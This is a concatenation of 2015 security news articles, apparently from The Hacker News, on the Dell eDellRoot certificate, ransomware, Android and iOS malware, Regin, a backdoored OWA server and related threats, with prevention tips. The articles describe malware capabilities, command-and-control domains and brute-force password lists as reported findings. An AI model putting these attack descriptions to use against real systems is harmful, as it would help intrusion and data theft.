The rogue certificate, dubbed eDellRoot, was first discovered over the weekend by a software programmer named Joe Nord. The certificate is so creepy that it automatically re-installs itself even when removed from the Windows operating system. Also Read: Lenovo Caught Using Rootkit to Secretly Install Unremovable Software Superfish 2.0: Unkillable Zombie The self-signed transport layer security (TLS) credential came pre-installed as a root certificate on Dell PCs and laptops that are signed with the same private cryptographic key, which is stored locally. That means an attacker with moderate technical skills can extract the key and abuse it to sign forged version of TLS certificates for any HTTPS-protected site on the Internet, exposing users to all manner of SSL attacks. The certificate key can be used to conduct man-in-the-middle (MITM) attacks on Dell owners, silently stealing user names, passwords, session cookies, and other sensitive information when the affected Dell machines are connected to a malicious Wi-Fi hotspots in cafes, hospitals or airports. The problem is similar to the scandal that hit Lenovo in February when the PC manufacturer was caught pre-installing an invasive adware program called Superfish with a similar self-signed cert to inject third-party advertisements into websites on browsers. Must Read: Automatic Superfish Removal Tool Although Dell's case is different as there is no indication that the certificate is being used to inject advertisements on the laptops, the resulting security issue is the same. Affected PCs and Laptops The self-signed certificate key was discovered to be pre-installed as a root certificate on at least three Dell laptop models: Dell Inspiron 5000 series notebook Dell XPS 15 Dell XPS 13 This indicates that the dangerous certificate may be present on a significant number of the Dell desktops and laptops currently on the market, specifically recent Dell Inspiron Desktop, XPS, and Precision M4800 and Latitude models. To Check if Your Computer is Vulnerable To discover the dangerous certificate: Open up the Start menu Select Run Type in certmgr.msc – the Windows certificate manager – into the box and Hit Enter Open up the Trusted Root Certification Authority folder on the left Select Certificates Search for eDellRoot Once found, right-click over eDellRoot and hit \"Remove.\" It appears to be gone, but actually it's not. Reboot your computer and reopen certmgr.msc and search for the certificate \"eDellRoot\". Yeah, the removed root CA cert is back. What Should You do? How to Remove? It seems that even if the certificate is clearly fraudulent, Google Chrome and Microsoft Edge and Internet Explorer browsers always establish an encrypted Web session with no warnings. But fortunately, Mozilla's Firefox web browser generates an alert warning that the certificate was not trusted. So, Dell customers with new XPS, Precision, and Inspiron models are advised to use Firefox to browse the web. To fix the issue completely, Dell users will need to manually revoke the certificate permissions, which is a complex and technically demanding task. Moreover, security researcher Darren Kemp from Duo Security says that the problem may be even worse than what Nord suggested. According to an analysis done by Kempa, a bundled plugin re-installs the root CA file when it is removed. So, to remove the eDellRoot certificate completely, you must: First delete Dell.Foundation.Agent.Plugins.eDell.dll from your system Then remove the eDellRoot root CA certificate Dell's Response In a statement, a Dell spokesperson said the company is investigating the report and looking into the certificate, but emphasized the company’s policy of minimizing pre-loaded software for security reasons. \"Customer security and privacy is a top concern for Dell,\" the spokesperson said. \"We've a team investigating the current [issue] and will update you as soon as we have more information.\"" }

Additionally, when it launches, the malware starts downloading: The Ransom Message containing the demands of fraudsters A file containing the public RSA key After that, the Ransomware starts as a daemon and deletes all of the original files. The RSA key is then used to store AES keys that are used by the ransomware to encrypt the local files on the infected computer. The ransomware also adds the .encrypt extension to each file it encrypts and writes a ransom text message in every folder.

Targeting Linux-Powered Websites and Servers The malware specifically encrypts files in folders that are typically found in Linux Web server setups, including directories like home, root, MySQL, Apache, and any directory that includes terms such as git, svn, webapp, www, public_html, or backup. Moreover, the ransomware looks for files that have extensions specific to Web development environments including .js, .css, .properties, .xml, .ruby, .php, .html, .gz, and .asp, as well as other file extensions like .rar, .7z, .xls, .pdf, .doc, .avi, .mov, .png, and .jpg. Once the victim pays the ransom amount, the system receives a signal to pass over the directories again to decrypt the files. Until security researchers create a decryption program, they recommend webmasters to backup all important data and keep all their files in place in case they are targeted.

Threat intelligence can help you solve the following problems:How do I keep up to date on the overwhelming amount of information on security threats…including bad actors, methods, vulnerabilities, targets, etc.? How do I get more proactive about future security threats? How do I inform my leaders about the dangers and repercussions of specific security threats? Threat Intelligence: What is it? Threat intelligence has received a lot of attention lately. While there are many different definitions, here are a few that get quoted often:Threat intelligence is evidence-based knowledge, including context, mechanisms, indicators, implications and actionable advice, about an existing or emerging menace or hazard to assets that can be used to inform decisions regarding the subject's response to that menace or hazard. – Gartner The set of data collected, assessed and applied regarding security threats, threat actors, exploits, malware, vulnerabilities and compromise indicators – SANS Institute Why is everyone talking about it? Verizon’s 2015 DBIR estimated a financial loss of $400 million from 700 million compromised records, which resulted from 79,790 security incidents! As long as security threats and breaches occur, every business will look for ways to protect their data. The threat landscape is always changing and the business risk is increasing because of our dependence on IT systems. Threats come from internal as well as external sources. Bottom line is, organizations are under tremendous pressure to manage threats. Though information in the form of raw data is available abundantly, it is hard and time-consuming to get meaningful information based on which proactive measures can be set. This naturally pulls more and more users towards threat intelligence as it helps to prioritize threats within the deluge of data, alerts, and attacks and provides actionable information. The table below presents several common indicators of compromise that can be identified with threat intelligence feeds: Category Indicators of Compromise Examples Network IP addresses URLs Domain names Malware infections targeting internal hosts that are communicating with known bad actors Email Sender’s email address and email subject Attachments Links Phishing attempts where internal hosts click on an unsuspecting email and “phone home” to a malicious command and control server Host-Based Filenames and file hashes (e.g. MD5) Registry keys Dynamic link libraries (DLLs) Mutex names External attacks from hosts that might be infected themselves or are already known for nefarious activity Threat Intelligence capabilities Attacks can be broadly categorized as user based, application based and infrastructure based threats. Some of the most common threats are SQL injections, DDoS, web application attacks and phishing. It is important to have an IT security solution that provides threat intelligence capabilities to manage these attacks by being both proactive and responsive. Attackers are constantly changing their methods to challenge security systems. Therefore, it becomes inevitable for organizations to get threat intelligence from a variety of sources. One of the proven methods to stay on top of attacks is to detect and respond to threats with a SIEM (Security Information & Event Management system). A SIEM can be used to track everything that happens in your environment and identify anomalous activities. Isolated incidents might look unrelated, but with event correlation and threat intelligence, you can see what is actually happening in your environment. Nowadays, IT security professionals must operate under the assumed breach mentality. Comparing monitored traffic against known bad actors sourced from threat intelligence would help in identifying malicious activities. However, this could be manual and time-consuming. Integrating indicator based threat intelligence to a SEIM security solution would help in identifying compromised system and possibly even prevent some attacks. Best Practices Integrating threat intelligence and responding to attacks is not enough to combat the ever-changing threat landscape. You need to analyze the situation and determine threats you are likely to face, based on which you can come up with precautionary measures. Here is a list of several best practices:Have an application whitelist and blacklist. This helps in preventing execution of malicious or unapproved programs including, .DLL files, scripts and installers. Check your logs carefully to see if an attempted attack was an isolated event, or if the vulnerability had been exploited before. Determine what was changed in the attempted attack. Audit logs and identify why this incident happened – reasons could range from system vulnerability to an out-of-date driver. What will threat intelligence enabled SIEM solveA SIEM, like SolarWinds Log & Event Manager, collects and normalizes log data from monitored traffic and automatically tags suspicious events. With integrated threat intelligence mechanism and built-in rules, the monitored events can be compared against the list of constantly updated known bad actors.You can quickly search & monitor for hits from the bad actors against the log data in real time and identify common indicators of compromise. You can automatically respond with actions like blocking known bad IP addresses, in case of malicious attack attempts.

The SDK in question is Moplus, which may not be directly available to the public but has already made its way into more than 14,000 Android apps, of which around 4,000 are actually created by Baidu. Overall, more than 100 Million Android users, who have downloaded these apps on their smartphones, are in danger. Security researchers from Trend Micro have discovered a vulnerability in the Moplus SDK, called Wormhole, that allows attackers to launch an unsecured and unauthenticated HTTP server connection on affected devices, which works silently in the background, without the user's knowledge. Also Read: More than 26 Android Phone Models Shipped with Pre-Installed Spyware This unsecured server does not use authentication and can accept requests from anyone on the Internet. Though the server is controlled by the attacker, who can send requests to a particular port of this hidden HTTP server to execute malicious commands. Malicious Functionalities of Wormhole Currently, the researchers have identified that the SDK is using the port 6259 or 40310 to perform malicious activities on affected Android devices, which includes: Send SMS messages Make phone calls Get mobile phone details Add new contacts Get a list of local apps Download files on the device Upload files from the device Silently install other apps (if the phone is rooted) Push Web pages Get phone's geo-location, and many more Since the SDK automatically installs the Web server when a Moplus SDK app is opened, hackers just need to scan a mobile network for port 6259 or 40310, thereby finding vulnerable devices they can abuse. Also Read: Android Malware Can Spy On You Even When Your Mobile Is Off Wormhole is More Dangerous than Stagefright The vulnerability, according to researchers, is potentially easier to exploit than the Stagefright flaw, as Wormhole doesn't require social engineering to infect an unsuspecting user. Trend Micro has also found at least one malware strain (detected as ANDROIDOS_WORMHOLE.HRXA) in the wild that takes advantage of Wormhole in Moplus SDK. Researchers informed both Baidu as well as Google of the vulnerability. As a result, Baidu has just pushed a partial fix for the problem by releasing a new version of the SDK that removed some of the SDK's functionality, but not all. The HTTP server remains online and active; however, Baidu assured its users that no backdoor exists now. Must Read: Stagefright Bug 2.0 — One Billion Android SmartPhones Vulnerable to Hacking This isn't the first time a Chinese company has caught distributing malicious SDK. Just a few days ago, the Taomike SDK – one of the biggest mobile ad solutions in China – was caught secretly spying on users' SMS messages and uploading them to a server in China. The same malicious functionality was also discovered two weeks back in another SDK developed by Youmi; that affected 256 iOS apps, which were caught using private APIs to collect users private data. However, Apple eventually banned those apps from its App Store." }

If so, there is some potentially good news for you. You may now recover your encrypted files for FREE! – Thanks to the efforts of Dutch police and antivirus maker Kaspersky Lab. Security researchers from Kaspersky Lab and the Dutch Public Prosecution Service have obtained and published the last set of encryption keys from command-and-control (C&C) servers used by two related ransomware threats – CoinVault and Bitcryptor. Security researchers first observed CoinVault ransomware attacks in May 2014. Since then, CoinVault has made more than 1,500 victims in more than 108 countries. In April 2015, the Dutch police obtained 'Decryption keys' database from a seized command and control server of CoinVault. Ransomware Decryption Tool Those decryption keys were then used by Kaspersky Lab to set up a Ransomware Decryptor Service, which included a set of around 750 decryption keys recovered from CoinVault servers hosted in the Netherlands. After that raid, the CoinVault's authors slowly updated their code, eventually releasing a second-generation CoinVault version that they named Bitcryptor. However, last month, the Dutch authorities arrested two men in connection with CoinVault and Bitcryptor ransomware attacks, leading to the recovery of additional 14,031 decryption keys. The keys have now been updated to the Kaspersky's Ransomware Decryptor Service and published on the noransom.kaspersky.com website. Those victims that had their PCs infected by these ransomware programs and still have the encrypted data lying around can now download these keys to unlock their personal files. How to Decrypt CoinVault and Bitcryptor Ransomware: Step 1: Note down the Bitcoin wallet address mentioned by the malware. Step 2: Get the encrypted file list from the ransomware interface. Step 3: Then download an effective antivirus and remove CoinVault Ransomware. Step 4: Open https://noransom.kaspersky.com and download the decryption tool released by Kaspersky Labs. Step 5: Install additional libraries and Decrypt your files. However, there's only one catch: \"If you get infected by this ransomware in the near future, you are out of luck.\" Ransomware on Rise Ransomware has emerged as one of the biggest Internet threats to the web users in recent years. The authors of the notorious CryptoWall ransomware have raised more than $325 MILLION (£212 million) in this past year alone. Typically, hackers primarily gain access to a user's computer using ransomware malware that heavily encrypts data files with a strong cryptographic algorithm, and then demand a ransom money (to be paid in Bitcoin), which ranges from $200 to $10,000. How to Prevent Yourself Against Ransomware Attacks? Just few days back, the Federal Bureau of Investigation (FBI) advised ransomware victims to just pay off the criminals in order to see their valuable data again. However, in my opinion, the best defense against these threats is to ensure that all your important files are regularly backed up to a separate drive or storage that are only temporarily connected and can not be reached by the attackers. A few more things you should keep in mind to prevent your Computer from getting infected with ransomware and other malware threats are: Ensure your system software and antivirus definitions are up-to-date. Avoid visiting suspicious websites. Avoid Opening Emails and attachments from unknown sources." }

The Trojan is designed to infect both 32-bit and 64-bit computers running Windows 7, Windows Vista, and Windows XP. Duuzer gives attackers remote access to the compromised computer, allowing them to: Collect system and drive information Create, enumerate, and end processes Access, modify and delete files Upload and Download additional files Change the time attributes of files Execute malicious commands Steal data from infected system Know about victim’s Operating System Duuzer Infects via Spear Phishing or Watering Hole Attacks It is currently unclear how the malware is being distributed, but according to Symantec Researchers, the most obvious routes are Spear Phishing campaigns and Watering Hole attacks. Once infected, Duuzer checks if the system is running on a virtual machine like VMWare or Virtual Box to ensure that security researchers are not analyzing the malware before performing its malicious routines. Moreover, the Trojan identifies the existing software configured to run on startup and takes the name of that legitimate software on an infected computer and spread across the system. Duuzer's first sets up a backdoor on the machine, allowing attackers physical access to the system. The attackers then manually run commands through the backdoor on affected computers. They can perform a variety of operations mentioned above. \"Based on our analysis of Duuzer, the attackers behind the threat appear to be experienced and have knowledge about security researchers' analysis techniques,\" researchers said. \"Their motivation seems to be obtaining valuable information from their targets’ computers.\" 'Brambul' Worm and 'Joanap' Trojan also Detected Research also discovered a dropper that infects computers with a worm known as Brambul and a Backdoor Trojan called Joanap. Both of them mostly work together and typically used to log and monitor infected systems remotely. It is still unclear how the dropper is being distributed; however, it is believed that it comes from malicious emails. The worm detected as W32.Brambul uses brute-force attacks via the Server Message Block (SMB) protocol to spread from one computer to another. Once infected, the Brambul worm connects to random IP addresses on the local network and authenticates itself through SMB using common passwords, like 'password,' 'login,' '123123,' 'abc123' and 'iloveyou.' Besides attacking other computers via SMB, Brambul creates a network share on compromised computers, usually the system drive, and then sends the computer's details and login credentials to a predefined email address. Connection between Duuzer, Brambul and Joanap According to Symantec, Duuzer has a connection with both Joanap and Brambul...But how? Once infected, Brambul drops other pieces of malware on infected machines, either Duuzer or Joanap. Systems infected with Brambul have been used as command-and-control (CnC) servers for Duuzer and have also been compromised with Duuzer. If Joanap is dropped, the Trojan will register itself as a local OS service, named \"SmartCard Protector.\" The Trojan opens a backdoor on the compromised machine and starts: Sending specific files to the attackers Saving or deleting files Downloading and executing files Executing or terminating processes Propagating instructions it receives from the C&C server How to get rid of this ARMY? Though Duuzer, Brambul, and Joanap are just a small selection of many threats affecting South Korean organizations with a very low-risk level. But still, it is recommended for the users and businesses to keep themselves safe and protected by following these steps and prevent their systems from being compromised with this malware: Use a firewall to block all incoming connections from the Internet to services that shouldn't be publicly available. You should, by default, deny all incoming connections and only allow services you explicitly want to offer to the outside world. Use Complex Passwords as it makes it difficult to crack. Turned OFF Bluetooth if it is not required for mobile devices. Also, turn off other services not required at present. Train your employees not to open email or messages attachments unless they are expecting them. For more details, head on the Symantec's official blog." }

If your computer gets hacked and infected with malware that holds your data for ransom, just pay off the criminals to see your valuable data again and do not expect the FBI to save them – it's what the FBI is advising concerning ransomware. Ransomware is a sophisticated malicious software that lets hacker encrypts all the contents of a victim's hard drive or/and server and demands ransom (typically in Bitcoins) for the decrypt key. Also Read: Free Ransomware Decryption and Malware Removal ToolKit Federal agencies and the FBI have long urged people not to pay ransom to the criminals, as there is no guarantee that they will even receive an unlock key. The FBI – 'Better Pay up the Ransom' However, while speaking at the 2015 Cyber Security Summit on Wednesday, Assistant Special Agent Joseph Bonavolonta, who oversees the FBI's Boston office, advised the companies infected with ransomware to better pay up the ransom, according to a recent report by Security Ledger. \"The ransomware is that good,\" said Bonavolonta. \"To be honest, we often advise people just to pay the ransom.\" So, is the FBI now sure that Paying Ransom would save the victim's data? Malicious programs such as Cryptolocker, Cryptowall, and Reveton uses \"ultra secure\" encryption algorithms to encrypt victims' data, and the key to decrypt data can cost victims from $200 to $10,000. However, even after paying this much of amount, there is no guarantee that victims will receive the key to recovering their data. Even the police are not immune to Ransomware attacks. Cryptowall – currently the most widespread malware used – alone made criminal hackers over 18 Million in dollars from April 2014 to June 2015. Due to the success of ransomware on such a vast scale, Bonavolonta said hackers are likely to keep their ransom demands low in an attempt to maximize profit. For this reason, they are mostly honest, he said, adding, \"You do get your access back.\" Also Read: Anyone can Now Create their Own Ransomware using This Hacking ToolKit This advice from the FBI agent counters many public advisories on the ransomware. Also, not everyone would agree with what Bonavolonta advised because fulfilling demands of bad guys is equivalent to encouraging their bad practices. Prevention is the Best Practice As I previously recommended, the best defense measure against Ransomware is creating awareness within the organizations, as well as maintaining backups that are rotated regularly. Most viruses are introduced by opening infected attachments or clicking on links to malware usually contained in spam emails. So, DO NOT CLICK on links provided in emails and attachments from unknown sources.

According to a recent report published by Der Spiegel, the laptop of the Chancellery division leader was infected with Regin – a highly advanced espionage malware program that has been linked to the National Security Agency (NSA) and its UK counterpart, the Government Communications Headquarters (GCHQ). As The Hacker News reported almost a year ago, Regin is one of the most highly advanced, sophisticated malware programs that was used to spy on a wide range of international targets including: Internet service providers (ISPs) Telecommunications backbone operators Energy firms Airlines Government entities Research institutes Other high-profile individuals …around the world since at least 2008. Regin has dozens of modules that enable a range of functionality, including: Capturing screenshots Seizing control of an infected computer's mouse Stealing passwords Monitoring network traffic Recovering deleted files Data exfiltration In-depth technical analysis showed that Regin bears some resemblance to the infamous espionage trojans Flame and Duqu, as well as Stuxnet worm that the US and Israel reportedly used to sabotage Iran's nuclear program. Files leaked by former NSA contractor Edward Snowden have further linked Regin to the NSA, specifically to a keylogging plugin dubbed QWERTY that was used in the NSA's WarriorPride framework. The bottom line: Regin and WARRIORPRIDE are one and the same thing. Recent Der Spiegel reports that Regin had been discovered infecting the laptop of a head of the Federal Chancellery Unit – the federal agency that serves the office of the Chancellor (presently Mrs Angela Merkel) – has once again strained relationships between Germany and the United States. Previously the relations between the two got deteriorated when Snowden documents revealed that the NSA agents tapped into Angela Merkel's mobile phone. The U.S. Prosecutors in Germany investigated that claim but dropped later in June due to insufficient evidence. The Officials have initiated an investigation into the latest discovery and aren't jumping to any conclusions yet, but it is easy to guess where their suspicions lie. If the evidence holds up, and if Regin is indeed WARRIORPRIDE, it could worsen the relationships that have already turned a bit sour. However, since the tool is used by the five-eyes of different countries, identifying the culprit might prove difficult." }

The new adware software, dubbed \"eFast Browser,\" works by installing and running itself in place of Google Chrome The adware does all kinds of malicious activities that we have seen quite often over the years: Generates pop-up, coupon, pop-under and other similar ads on your screen Placing other advertisements into your web pages Redirects you to malicious websites containing bogus contents Tracking your movements on the web to help nefarious marketers send more crap your way to generating revenue Therefore, having eFast Browser installed on your machine may lead to serious privacy issues or even identity theft. What's Nefariously Intriguing About this Adware? The thing that makes this Adware different from others is that instead of taking control over your browser, eFast Browser uses a deceiving method of replacing your entire browser with a malicious copy of Chrome. In a report published Malwarebytes detailed that the nefarious software attempts to delete Chrome and itself takes its place, allowing it to hijack several file associations including HTML, JPG, PDF, and GIF, as well as URLs associations including HTTP, HTTPS, and MAILTO. The eFast Browser is based on Google's Chromium open-source software, so the browser maintains the look and feel of Google Chrome at first glance, tricking users into believing that they are using the legitimate Chrome browser. The malicious software program then replaces any Chrome desktop website shortcuts with its own versions, showing a striking design resemblance with window and icons from Chrome. \"The installer for eFast also deletes all the shortcuts to Google Chrome on your taskbar and desktop,\" wrote Malwarebytes, \"most likely hoping to confuse the user with their very similar icons.\" What's more? The eFast Browser is based on Google's Chromium open-source software, so the browser maintains the look and feel of Google Chrome at first glance, tricking users into believing that they are using the legitimate Chrome browser. The malicious computer program comes from a company calling itself Clara Labs, who developed a slew of similar browsers under titles such as BoBrowser, Unico, and Tortuga.

It's easier for malicious software to replace your browser than to infect it. This is due to Chrome's security against in-browser malware that cyber criminals are now overwriting the browser completely. It is relatively easy to avoid installing eFast Browser and, fortunately, also relatively easy to uninstall if you have found it on your computer.

Chinese hacking groups are better known for attacking and stealing information, organized cyber crimes, theft of intellectual property and state-sponsored cyber espionage attacks. But it seems that several Chinese hacker groups have now shifted their motive of hacking towards ‘making money’. How much Money Hackers Actually Make? It is a known fact that hacking makes money, but how much? Answer: At least $4,500,000/year from one malware campaign. How? We often observe mobile and desktop applications bundled with Ad-displaying programs, called Adware, to generate revenue. Just last week we reported about “Kemoge Android Adware,” disguising itself as popular apps, is making the rounds in as many as 20 countries. Kemoge malware, whose origin is suspected from China, can root vulnerable Android devices, which practically allows hackers to take over victim’s Android device. Once installed, the malware automatically download other Apps it gets paid to promote. But Kemoge adware is not alone, the researchers have discovered some it's variants that belong to the same malware family. Chinese Adware Family Threatening your Android In a recent blog post, Security experts at Cheetah Mobile company, developers of CM Security and Antivirus apps, detailed about how Chinese hackers are making millions of profits from underground App distribution chains. Other members of the same family are: Ghost Push Braintest Guaranteed Clicks RetroTetri All these malware under same illegal Mobile Marketing Industry Chain follow a similar modus operandi; which is: Repackage popular apps to injected malicious code and Ad components Bypass Google Play Store’s Bouncer Security Exploiting existing Android vulnerabilities to gain Admin-level permissions Root users’ devices that make them unable to uninstall the virus And then promote malicious apps through legitimate channels “As users are completely unable to uninstall these malicious apps, the virus developers soon get a massive number of active users.” Cheetah Mobile researcher said. “With this user base, the virus developer is able to set up a marketing promotion company and become a mobile dealer. Then they have the qualifications to cooperate with ad sponsors, making money by distributing products for advertisers.” These malicious apps were found on some famous App Stores, including Google Play, Aptoide and Mobogonie. Some Critical Findings from their Research are: This Virus family includes 4000 Samples The Adware is affecting Android versions from 2.3 to 5.1.

Counting from a simple text message that could hack an Android phone remotely to the Stagefright bug making Billion users vulnerable. Now, the latest is the 'Kemoge Malware' that has made its debut as an Adware on the Android mobile phones, allowing third-party app stores to fetch your device's information and take full control of it. Security researchers from FireEye Labs have discovered that Kemoge malicious adware family is spreading in 20 countries around the globe. Also, the origin of the Adware's attack is suspected from China. What is Kemoge? The name given to the malicious Adware family is because of its command and control (C2) domain: aps.kemoge.net. Kemoge is an Adware in the disguise of popular Apps; it has circulated in such numbers because it takes the name of popular apps and repackages them with the malicious code and make them available to the user. They even use the same developer name, as used by the verified and clean apps on the official Play Store. Some of the popular apps getting affected are:(Image) Talking Tom 3 Calculator Shareit Assistive Touch WiFi Enhancer How does Kemoge Work? The attacker sets up a genuine looking interface and uploads the apps to third-party app stores and plays smart by promoting the download links via websites and in-app advertisements. Some aggressive ad networks gaining root privilege can also automatically install the samples. Once activated on the device, Kemoge collects device information and uploads it to the ad server, then it slyly serves ads from the background. Victims get ad banners frequently regardless of the current activity as ads even pop-up when the user remains on the Android home screen. \"Initially Kemoge is just annoying, but it soon turns evil,\" said FireEye researchers. Kemoge even Affects Rooted Devices The malicious adware injects eight root exploits to root phones, targeting a wide range of device models. Some of the exploits are compiled from open source projects whereas some come from the commercial tool \"Root Dashi\" (or \"Root Master\"). \"After gaining root, it executes root.sh to obtain persistency,\" FireEye researchers said. \"Afterwards, it implants the AndroidRTService.apk into /system partition as Launcher0928.apk -- the filename imitates the legit launcher system service. Moreover, the package name of this apk also looks like authentic services, e.g. com.facebook.qdservice.rp.provider and com.android.provider.setting.\" Moreover, the malicious system service ( Launcher0928.apk) contacts aps.kemoge.net for commands. How does Kemoge Evade Detection? To evade detection, Kemoge communicates with the server at various time intervals. The malware runs malicious code briefly at the first launch or 24 hours after installation. In each enquiry, Kemoge sends the data including phone's IMEI, IMSI, storage information, and installed app information to a remote third-party server. After uploading the device's information, the malware asks commands from the server, which reverts with a command out of following three domains and the malicious system service executes it. The commands are: Uninstall designated applications Launch designated applications Download and Install applications from URLs given by server FireEye researchers conducted their research on Nexus 7 running Android 4.3 (JellyBean). While experimenting, the server commanded the device, such that it uninstalled the legitimate apps and made the device filled with malicious codes. How to Protect Against Kemoge? Kemoge is a dangerous threat and to stay safe you are advised to: Never click on any suspicious links from emails, SMS, websites, or advertisements. Never install apps outside of the official App Store. Keep your Android devices up-to-date in order to avoid being rooted by public known vulnerabilities (Upgrading device to the latest version of OS provides some security but doesn't always guarantee protection). Uninstall the app showing Ads. To know more about Kemoge, follow FireEye's official blog. Also, if you faced any such issues with your Android device, then identify the app supplying malicious Adware to you and let us know in the comment below." }

Yes, $30 MILLLLLLION annually. Researchers from cyber security firm Cisco announced that they discovered a large ransomware campaign connected to the Angler Exploit Kit, one of the most potent exploit kits available in the underground market for hacking into computers. Researchers noticed that the large percentage of infected users were connecting to servers belonging to hosting provider Limestone Networks. After digging out more, they estimated that a single hacker or a group of hackers is targeting up to 90,000 end users a day. Here are some estimates by Cisco researchers after investigating the operation: Life of an Angler exploit server is one day Around 3600 users are compromised per day by ransomware 3% of targets paid the average ransom demand of $300 to the hackers As a result, the researchers estimated that this particular hacker or a group of hackers is generating an annual revenue of more than $34 Million. Remember, it's just a figure estimated by Cisco researchers following the log files retrieved from just one server. The actual number could be even larger than $30 Million annually, but we can not immediately come to any conclusions. Researchers from Cisco Systems' Talos Security unit noted that \"using simple math [one] can easily determine that this [particular] adversary is making potentially $3 Million a month,\" but \"It is difficult to be 100% accurate with these numbers.\" Hackers Making $60 Million Annually The security firm also claims that this hacker or group of hackers is responsible for up to 50% of Angler Exploit Kit activity, which means that the Angler kit might be generating revenue of more than $60M annually for hackers around the world. The affected hosting provider Limestone Networks have since shut down the malicious servers after Cisco researchers contacted them. Angler Exploit kit, first identified in late 2013, has managed to become one of the most popular exploit kits in the market. Essentially it packages a number of hacking tools that take advantage of vulnerabilities Flash, Java and other browser plugins to break into targets' systems. Now cyber criminals are making use of ransomware in their kit that yield them more money per attack. \"This is a significant blow to the emerging hacker economy,\" researchers said, \"where ransomware and the black market sale of stolen IP, credit card info and personally identifiable information (PII) are generating hundreds of millions of dollars annually.\" How to Protect Against Ransomware? However, there are several ways to help protect your computer against ransomware and other malware threats: Make sure to keep all of the software on your computer up to date. Make sure that automatic updating is turned on to get all the latest security updates. Use secure connections for sensitive transactions. Never open any attachment unless you know who it's from and why they are sending it. Use virtual keyboard for internet banking. Use strong alphanumeric and symbol passwords. Common sense is another useful weapon in the fight against viruses. Also Read: How to protect your computer from CryptoLocker ransomware malware?

The Microsoft Outlook Web Application or OWA is an Internet-facing webmail server that is being deployed in private companies and organisations to provide internal emailing capabilities. Researchers from security vendor Cybereason discovered a suspicious DLL file loaded into the company's OWA server that siphoned decrypted HTTPS server requests. Although the file had the same name as another benign DLL file, the suspicious DLL file was unsigned and loaded from another directory. Hackers Placed Malicious DLL on OWA Server According to the security firm, the attacker replaced the OWAAUTH.dll file (used by OWA as part of the authentication mechanism) with one that contained a dangerous backdoor. Since it ran on the OWA server, the backdoored DLL file allowed hackers to collect all HTTPS-protected server requests, including login information after they had been decrypted, i.e., in clear text. \"OWA was configured in [such] a way that [it] allowed Internet-facing access to the server,\" Cybereason wrote in a post published Monday. \"This enabled the hackers to establish persistent control over the entire organization's environment without being detected for several months.\" Hackers Stole 11,000 Credentials Every user accessing the hacked server had their username & password compromised and stored by the attackers. Researchers discovered more than 11,000 usernames and passwords combinations in a log.txt file in the server's \"C:\\\" partition. Log.txt file is believed to be used by attackers to store all logged data. The unnamed company that detected \"behavioural abnormalities\" across its network before reaching out to security firm Cybereason had more than 19,000 endpoints. To prevent their backdoor from being removed, the attackers also created an IIS (Microsoft's Web server) filter through which they loaded the malicious OWAAUTH.dll file every time the server was restarted. To add icing to the cake — the advanced persistent attackers utilized a .NET assembly cache in order to avoid auditing and security inspection. The security firm did not say how widespread this attack is beyond it targeting one organisation, but there are chances that the attack is or could be hitting other large organizations as well." }

Someone Just Hacked 10,000 Routers to Make them More Secure", "Address" : "https://thehackernews.com/2015/10/hack-wifi-router.html", "Date" : "2015-10-05T00:40:00-11:00", "Article" : "Has anyone ever heard about a \"Vigilante-style Hacker,\" who hacks every possible system to make them more Secure? No. It's not funny, neither a movie story: Reportedly, someone is hacking thousands unprotected Wi-Fi routers everywhere and apparently forcing owners to make them more Secure. Security firm Symantec has discovered a new malware, dubbed \"Linux.Wifatch\" a.k.a \"Ifwatch,\" infected more than 10,000 vulnerable 'Internet of Things' devices, and spreading quickly. However, Linux.Wifatch not only removes malicious backdoor but also encourages users to update their weak passwords. How Does Linux.Wifatch Work? Once a device is infected, the Linux.Wifatch malware connects to a peer-to-peer network that is being used to distribute threat updates. Linux.Wifatch's code does not deploy any payload for malicious activities, such as to carry out DDoS attacks, rather it detects and remediates the known families of malicious codes present on the compromised devices. After Installation, whenever 'Linux.Wifatch' detects any malicious activity or malware on the vulnerable device; it asks the device owners to: Change their default password, Close potentially vulnerable Telnet port immediately However, the malware does not appear to be used for malicious purposes yet, but researchers have found that the malware contains a number of backdoors that can be used by its developer to carry out malicious tasks remotely. Linux.Wifatch, written in the Perl programming language, was first discovered in November last year by an independent malware researcher, who calls himself \"Loot Myself.\" The researcher shared complete details of the malware in a two-part series on his blog with the same name - \"Loot Myself: Malware Analysis and Botnet tracking.\" In 2014, the researcher sensed unwanted activities in his home router and for which he could not find the location as well. This curiosity made him explore more, and while digging deeper he decoded the roots of the malware- THE SOURCE CODE, written in Perl. After going through the source code, the researcher points out that the code is not obfuscated; it just uses compression and minification of the source code. Further, the researcher mentions about an unusual activity: \"To any NSA and FBI agents reading this: please consider whether defending the U.S. Constitution against all enemies, foreign or domestic, requires you to follow Snowden's example.\" he says in the blog post. How to Secure Your Wireless Router? Though the risk associated with Linux.Wifatch is low, the security researchers at Symantec are keeping an eye on its activities. They say with such a \"Malware-for-Good,\" it apparently creates a 'Benefit of the Doubt' as the author's intentions are unknown. The case hasn't closed yet, as Symantec says, \"It pays to be suspicious.\" Essential Security Measures Symantec had previously issued measures to get rid of this Malware. Here below you can read a few important recommendation in short: Use a Firewall to block all incoming connections Enforce a password policy Make sure to offer the lowest level of privileges to programs Disable AutoPlay Turn off file sharing if not needed How to Remove 'Linux.Wifatch' Malware? If you have also detected such activity on your home routers, you can get rid of the risk associated with it by: Resetting your device; as it will remove the Linux.Wifatch malware Keeping your device's software and firmware up to date Changing any default passwords that may be in use Resetting your passwords routinely More Ways to Protect your Network Further, you can protect your Wireless network by following few measures, that assure your security, like: Turning on your wireless router's encryption setting Turn the Firewall On Change Default Passwords Change the default \"SSID\" (service set identifier) of your devic Turn Network Name Broadcasting Off Use the MAC Address Filter" }

Last month, researchers identified more than 4,000 infected apps in Apple's official App Store, which was targeted by a malware attack in which some versions of software used by developers to build apps for iOS and OS X were infected with malware, named XcodeGhost. And Now: Researchers from a California-based network security firm Palo Alto Networks have discovered new malware that targets Apple's iOS users in China and Taiwan. Capabilities of YiSpecter Malware Dubbed YiSpecter, the malware infects iOS devices and once infected, YiSpecter can: Install unwanted apps Replace legitimate apps with ones it has downloaded Force apps to display unwanted, full-screen ads Change bookmarks as well as default search engines in Safari Send user information back to its server Automatically reappears even after a user manually deletes it from the iOS device It is still unclear how many users have been or could be infected by YiSpecter, but according to the researchers, this first instance of iOS malware targeting and succeeding in infecting non-jailbroken iOS devices has been around since November 2014. \"Whether an iPhone is jailbroken or not, the malware can be successfully downloaded and installed,\" the researchers wrote in a blog post on Monday. \"Even if you manually delete [YiSpecter], it will automatically re-appear.\" YiSpecter targets jailbroken as well as non-jailbroken iOS devices by abusing private APIs to allow its four components that are 